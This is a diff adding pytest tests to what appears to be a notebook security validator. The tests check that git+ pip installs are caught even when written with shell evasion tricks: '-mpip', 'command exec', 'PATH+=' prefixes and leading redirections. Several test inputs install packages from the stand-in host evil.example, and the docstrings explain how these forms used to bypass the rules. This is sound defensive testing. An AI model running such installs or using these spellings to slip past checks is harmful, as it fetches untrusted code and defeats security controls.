@@ -3322,3 +3322,85 @@ def test_a_redirection_only_exec_hands_nothing_over():
             "!exec pip install torch==2.11.0; pip install torch==2.12.0"
         )
     ] == [("install", ["torch==2.11.0"])]
+
+
+def test_the_attached_module_spelling_is_read():
+    """`python -mpip install ...` is a valid CPython invocation.
+
+    Both cell discovery and the invocation pattern required `pip` to be a separate word after
+    `-m`, and `\\b` finds no boundary between the `m` and the `p`, so the cell was never even
+    discovered and the git+ ban never ran.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!python -mpip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    for cell in ("!python -mpip install x", "!pip install x", "!python -m pip install x"):
+        assert nv._PIP_CELL_RE.search(cell) is not None, cell
+    # `-m` still has to name pip: another module attached to it is not an install.
+    assert nv.PIP_LINE_RE.match("!python -mbuild install x") is None
+
+
+def test_exec_is_found_behind_a_transparent_prefix():
+    """`command exec pip ...` hands the shell over exactly as `exec pip ...` does.
+
+    Verified locally: `bash -c 'command exec sh -c "exit 7"; echo reached'` never reaches the
+    echo. Testing the raw first word answered `command` and replayed the unreachable install.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        (inv.action, inv.packages)
+        for inv in nv.unconditional_pip_invocations(
+            "!command exec pip install torch==2.11.0; pip install torchcodec==0.10.0"
+        )
+    ] == [("install", ["torch==2.11.0"])]
+    assert nv._command_execs("!command exec pip install a") is True
+    # A redirection-only exec still hands nothing over, prefix or no prefix.
+    assert nv._command_execs("!command exec >/tmp/x") is False
+    assert nv._command_execs("!command pip install a") is False
+
+
+def test_an_append_assignment_is_still_an_assignment():
+    """bash runs the child with the appended value, so `PATH+=...` is a prefix, not a command.
+
+    Verified locally: `X=old; X+=new sh -c 'printf %s "$X"'` prints `oldnew`. Leaving the word
+    standing made it the supposed executable and the pip command behind it was missed.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert [
+        f.rule
+        for f in nv.rule_inst_001_git_plus(
+            "!PATH+=:/opt/bin pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+        )
+    ] == ["R-INST-001"]
+    assert nv._strip_exec_prefixes("PATH+=:/opt/bin pip install x") == ("pip install x", True)
+    # A plain assignment is unchanged, and a word that merely contains `+` is not one.
+    assert nv._strip_exec_prefixes("FOO=1 pip install x") == ("pip install x", True)
+    assert nv._strip_exec_prefixes("a+b pip install x") == ("a+b pip install x", False)
+
+
+def test_a_redirection_before_the_executable_is_consumed():
+    """A simple command may put its redirections before the command name.
+
+    Verified locally with a stub pip: `>/dev/null pip install whatever` really runs it, while
+    stopping at the redirection left it standing as the executable and every rule was bypassed.
+    """
+    nv = _load_notebook_validator_module()
+
+    for cell in (
+        "!>/tmp/install.log pip install git+https://evil.example/pkg.git",
+        "!> /tmp/install.log pip install git+https://evil.example/pkg.git",
+        "!FOO=1 2>/dev/null python -m pip install git+https://evil.example/pkg.git",
+        "!2>&1 pip install git+https://evil.example/pkg.git",
+    ):
+        assert [f.rule for f in nv.rule_inst_001_git_plus(cell, "nb.ipynb", 0)] == [
+            "R-INST-001"
+        ], cell
+    # A trailing redirection is the command's own and is left where it is.
+    assert nv._strip_exec_prefixes("pip install x >/tmp/log") == ("pip install x >/tmp/log", False)
